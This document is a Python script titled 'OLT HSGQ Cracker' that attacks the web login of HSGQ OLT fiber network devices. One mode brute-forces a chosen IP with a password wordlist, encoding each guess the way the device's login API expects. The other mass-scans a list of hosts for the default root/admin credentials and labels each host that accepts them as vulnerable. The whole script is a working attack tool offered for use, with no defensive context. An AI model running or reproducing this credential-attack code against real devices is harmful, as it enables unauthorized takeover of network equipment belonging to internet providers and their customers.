# Code by Mugi F.
# github.com/mugi789
# Bandung, 6 July 2024

import requests, hashlib, json, datetime
from base64 import b64encode

print(r"""
               |  
             / _ \
  OLT HSGQ \_\(_)/_/
   Cracker  _//"\\_
             /   \ 
      """)

def menu():
    print("1. Scan by single IP")
    print("2. Mass scan with default user")
    pilih = int(input(">>> "))
    if pilih == 1:
        ip = input("Input IP : ")
        user = input("Input User : ")
        pwd = input("Input File Wordlist : ")
        print("="*35)
        try:
            with open(pwd, "r") as pswrd:
                for line in pswrd:
                    baris = line.replace('\n', '')
                    pwd64 = b64encode(bytes(baris.encode('utf-8'))).decode("utf-8")
                    heder = {
                        'Host': ip,
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0',
                        'Accept': 'application/json, text/plain, */*',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'Accept-Encoding': 'gzip, deflate',
                        'Content-Type': 'application/json;charset=utf-8',
                        'X-Token': 'null',
                        'Content-Length': '130',
                        'Origin': 'http://'+ip,
                        'Connection': 'keep-alive',
                        'Referer': 'http://'+ip,
                        'Sec-GPC': '1',
                        'Priority': 'u=1'
                        }
                    mentah = {
                        "method": "set",
                        "param": {
                            "captcha_f": "",
                            "captcha_v": "",
                            "key": hashlib.md5(str(user+":"+baris).encode("utf-8")).hexdigest(),
                            "name": user,
                            "value": pwd64
                            }
                            }
                    crot = requests.post("http://"+ip+"/userlogin?form=login", data=json.dumps(mentah), headers=heder)
                    if crot.text.split(",")[1].split('"')[3] == "success":
                        print("="*35)
                        print("Password Found ^_^")
                        print("Host : "+ip)
                        print("User : "+user)
                        print("Password : "+baris)
                        print("="*35)
                        pass
                        break
                    elif crot.text.split(",")[1].split()[2] == "Error":
                        print("User not found")
                        print("Try changing to root user or something else")
                        print("="*35)
                        break
                    else:
                        print("Trying "+baris+" error ~ "+str(datetime.datetime.now().strftime("%H:%M:%S")))
                        pass
                else:
                    print("="*35)
                        
        except FileNotFoundError:
            print("Wordlist file not found")
        except requests.exceptions.ConnectionError:
            print("IP not found")
    elif pilih == 2:
        try:
            urlist = input("Input list file : ")
            with open(urlist, "r") as urlll:
                for list in urlll:
                    listx = list.replace("\n", "")
                    heder = {
                        'Host': listx,
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0',
                        'Accept': 'application/json, text/plain, */*',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'Accept-Encoding': 'gzip, deflate',
                        'Content-Type': 'application/json;charset=utf-8',
                        'X-Token': 'null',
                        'Content-Length': '130',
                        'Origin': 'http://'+listx,
                        'Connection': 'keep-alive',
                        'Referer': 'http://'+listx,
                        'Sec-GPC': '1',
                        'Priority': 'u=1'
                        }
                    dataraw = {
                        "method": "set",
                        "param": {
                            "captcha_f": "",
                            "captcha_v": "",
                            "key": "1761d487ba0cde5f285059b5cca9a22c",
                            "name": "root",
                            "value": "YWRtaW4="
                            }
                            }
                    crot = requests.post("http://"+listx+"/userlogin?form=login", data=json.dumps(dataraw), headers=heder, timeout=10)
                    if crot.text.split(",")[1].split('"')[3] == "success":
                        print(" ~> "+listx+" \033[32m[ VULN ]\033[39m")
                        pass
                    else:
                        print(" ~> "+listx+" \033[31m[ ERROR ]\033[39m")
        except FileNotFoundError:
            print("File not found")
menu()